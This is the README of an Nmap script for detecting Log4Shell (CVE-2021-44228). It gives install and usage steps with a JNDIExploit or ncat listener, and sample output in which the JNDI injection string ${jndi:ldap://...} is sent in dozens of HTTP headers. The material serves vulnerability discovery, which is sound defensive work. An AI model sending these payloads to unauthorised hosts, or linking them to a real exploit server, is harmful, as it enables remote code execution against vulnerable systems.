# Nmap Log4Shell NSE script for discovery Apache Log4j RCE (CVE-2021-44228)

CVE-2021-44228 is a remote code execution (RCE) vulnerability in Apache Log4j 2. An unauthenticated, remote attacker could exploit this flaw by sending a specially crafted request to a server running a vulnerable version of log4j. The crafted request uses a Java Naming and Directory Interface (JNDI) injection via a variety of services including:

-  Lightweight Directory Access Protocol (LDAP)
-  Secure LDAP (LDAPS)
-  Remote Method Invocation (RMI)
-  Domain Name Service (DNS)

If the vulnerable server uses log4j to log requests, the exploit will then request a malicious payload over JNDI through one of the services above from an attacker-controlled server. Successful exploitation could lead to RCE.


## Installation

Locate where your nmap scripts are located on your system:

- for *nix system it might be `~/.nmap/scripts/` or `$NMAPDIR`
- for Mac it might be `/usr/local/Cellar/nmap/<version>/share/nmap/scripts/`
- for Windows it might be `C:\Program Files (x86)\Nmap\scripts`

Copy the provided script (log4shell.nse) into that directory run `nmap --script-updatedb` to update the nmap script DB.


## Usage

### Method A:

Download JNDIExploit from GitHub (https://github.com/feihong-cs/JNDIExploit)

Start JNDIExploit server:

    java -jar JNDIExploit.jar

Run Nmap with --script log4shell.nse script

    nmap --script log4shell.nse [--script-args log4shell.callback-server=127.0.0.1:1389] [-p <port>] <target>

See JNDIExploit output for see the received LDAP query (Log4Shell/{target host}/{target port})

    [+] Received LDAP Query: log4shell/127.0.0.1/8080
    [!] Invalid LDAP Query: log4shell/127.0.0.1/8080

### Method B:

Listen a TCP port with netcat (or ncat):

    ncat -v -k -e /bin/true -l 1389

Run Nmap with --script log4shell.nse script

    nmap --script log4shell.nse [--script-args log4shell.callback-server=127.0.0.1:1389] [-p <port>] <target>

See the target IP address in netcat (or ncat) output:

    Ncat: Connection from 172.17.0.2.
    Ncat: Connection from 172.17.0.2:38898.


### Output

    nmap --script log4shell.nse --script-args log4shell.callback-server=172.17.42.1:389 -p 8080 172.17.42.1 
    Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-13 21:26 CET
    Nmap scan report for 172.17.42.1
    Host is up (0.000096s latency).

    PORT     STATE SERVICE
    8080/tcp open  http-proxy
    | log4shell: 
    |   (!) Sended payload ${jndi:ldap://172.17.42.1:389/log4shell/172.17.42.1/8080} using X-Api-Version header.
    |   For confirmation see 172.17.42.1:389 server log
    |   (!) Sended payload ${jndi:ldap://172.17.42.1:389/log4shell/172.17.42.1/8080} using User-Agent header.
    |   For confirmation see 172.17.42.1:389 server log
    |   (!) Sended payload ${jndi:ldap://172.17.42.1:389/log4shell/172.17.42.1/8080} using Cookie header.
    |   For confirmation see 172.17.42.1:389 server log
    |   (!) Sended payload ${jndi:ldap://172.17.42.1:389/log4shell/172.17.42.1/8080} using Referer header.
    |   For confirmation see 172.17.42.1:389 server log
    |   (!) Sended payload ${jndi:ldap://172.17.42.1:389/log4shell/172.17.42.1/8080} using Accept-Language header.
    |   For confirmation see 172.17.42.1:389 server log
    |   (!) Sended payload ${jndi:ldap://172.17.42.1:389/log4shell/172.17.42.1/8080} using Accept-Encoding header.
    |   For confirmation see 172.17.42.1:389 server log
    |   (!) Sended payload ${jndi:ldap://172.17.42.1:389/log4shell/172.17.42.1/8080} using Upgrade-Insecure-Requests header.
    |   For confirmation see 172.17.42.1:389 server log
    |   (!) Sended payload ${jndi:ldap://172.17.42.1:389/log4shell/172.17.42.1/8080} using Accept header.
    |   For confirmation see 172.17.42.1:389 server log
    |   (!) Sended payload ${jndi:ldap://172.17.42.1:389/log4shell/172.17.42.1/8080} using upgrade-insecure-requests header.
    |   For confirmation see 172.17.42.1:389 server log
    |   (!) Sended payload ${jndi:ldap://172.17.42.1:389/log4shell/172.17.42.1/8080} using Origin header.
    |   For confirmation see 172.17.42.1:389 server log
    |   (!) Sended payload ${jndi:ldap://172.17.42.1:389/log4shell/172.17.42.1/8080} using Pragma header.
    |   For confirmation see 172.17.42.1:389 server log
    |   (!) Sended payload ${jndi:ldap://172.17.42.1:389/log4shell/172.17.42.1/8080} using X-Requested-With header.
    |   For confirmation see 172.17.42.1:389 server log
    |   (!) Sended payload ${jndi:ldap://172.17.42.1:389/log4shell/172.17.42.1/8080} using X-CSRF-Token header.
    |   For confirmation see 172.17.42.1:389 server log
    |   (!) Sended payload ${jndi:ldap://172.17.42.1:389/log4shell/172.17.42.1/8080} using Dnt header.
    |   For confirmation see 172.17.42.1:389 server log
    |   (!) Sended payload ${jndi:ldap://172.17.42.1:389/log4shell/172.17.42.1/8080} using Content-Length header.
    |   For confirmation see 172.17.42.1:389 server log
    |   (!) Sended payload ${jndi:ldap://172.17.42.1:389/log4shell/172.17.42.1/8080} using Access-Control-Request-Method header.
    |   For confirmation see 172.17.42.1:389 server log
    |   (!) Sended payload ${jndi:ldap://172.17.42.1:389/log4shell/172.17.42.1/8080} using Access-Control-Request-Headers header.
    |   For confirmation see 172.17.42.1:389 server log
    |   (!) Sended payload ${jndi:ldap://172.17.42.1:389/log4shell/172.17.42.1/8080} using Warning header.
    |   For confirmation see 172.17.42.1:389 server log
    |   (!) Sended payload ${jndi:ldap://172.17.42.1:389/log4shell/172.17.42.1/8080} using Authorization header.
    |   For confirmation see 172.17.42.1:389 server log
    |   (!) Sended payload ${jndi:ldap://172.17.42.1:389/log4shell/172.17.42.1/8080} using TE header.
    |   For confirmation see 172.17.42.1:389 server log
    |   (!) Sended payload ${jndi:ldap://172.17.42.1:389/log4shell/172.17.42.1/8080} using Accept-Charset header.
    |   For confirmation see 172.17.42.1:389 server log
    |   (!) Sended payload ${jndi:ldap://172.17.42.1:389/log4shell/172.17.42.1/8080} using Accept-Datetime header.
    |   For confirmation see 172.17.42.1:389 server log
    |   (!) Sended payload ${jndi:ldap://172.17.42.1:389/log4shell/172.17.42.1/8080} using Date header.
    |   For confirmation see 172.17.42.1:389 server log
    |   (!) Sended payload ${jndi:ldap://172.17.42.1:389/log4shell/172.17.42.1/8080} using Expect header.
    |   For confirmation see 172.17.42.1:389 server log
    |   (!) Sended payload ${jndi:ldap://172.17.42.1:389/log4shell/172.17.42.1/8080} using Forwarded header.
    |   For confirmation see 172.17.42.1:389 server log
    |   (!) Sended payload ${jndi:ldap://172.17.42.1:389/log4shell/172.17.42.1/8080} using From header.
    |   For confirmation see 172.17.42.1:389 server log
    |   (!) Sended payload ${jndi:ldap://172.17.42.1:389/log4shell/172.17.42.1/8080} using Max-Forwards header.
    |   For confirmation see 172.17.42.1:389 server log
    |   (!) Sended payload ${jndi:ldap://172.17.42.1:389/log4shell/172.17.42.1/8080} using Proxy-Authorization header.
    |   For confirmation see 172.17.42.1:389 server log
    |   (!) Sended payload ${jndi:ldap://172.17.42.1:389/log4shell/172.17.42.1/8080} using Range, header.
    |   For confirmation see 172.17.42.1:389 server log
    |   (!) Sended payload ${jndi:ldap://172.17.42.1:389/log4shell/172.17.42.1/8080} using Content-Disposition header.
    |   For confirmation see 172.17.42.1:389 server log
    |   (!) Sended payload ${jndi:ldap://172.17.42.1:389/log4shell/172.17.42.1/8080} using Content-Encoding header.
    |   For confirmation see 172.17.42.1:389 server log
    |   (!) Sended payload ${jndi:ldap://172.17.42.1:389/log4shell/172.17.42.1/8080} using X-Amz-Target header.
    |   For confirmation see 172.17.42.1:389 server log
    |   (!) Sended payload ${jndi:ldap://172.17.42.1:389/log4shell/172.17.42.1/8080} using X-Amz-Date header.
    |   For confirmation see 172.17.42.1:389 server log
    |   (!) Sended payload ${jndi:ldap://172.17.42.1:389/log4shell/172.17.42.1/8080} using Content-Type header.
    |   For confirmation see 172.17.42.1:389 server log
    |   (!) Sended payload ${jndi:ldap://172.17.42.1:389/log4shell/172.17.42.1/8080} using Username header.
    |   For confirmation see 172.17.42.1:389 server log
    |   (!) Sended payload ${jndi:ldap://172.17.42.1:389/log4shell/172.17.42.1/8080} using IP header.
    |   For confirmation see 172.17.42.1:389 server log
    |   (!) Sended payload ${jndi:ldap://172.17.42.1:389/log4shell/172.17.42.1/8080} using IPaddress header.
    |   For confirmation see 172.17.42.1:389 server log
    |   (!) Sended payload ${jndi:ldap://172.17.42.1:389/log4shell/172.17.42.1/8080} using Hostname header.
    |_  For confirmation see 172.17.42.1:389 server log


# Legal Disclaimer
This project is made for educational and ethical testing purposes only. Usage of nmap-log4shell for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program.


# License
The project is licensed under MIT License.


# Author

- Giuseppe Di Terlizzi (giterlizzi)
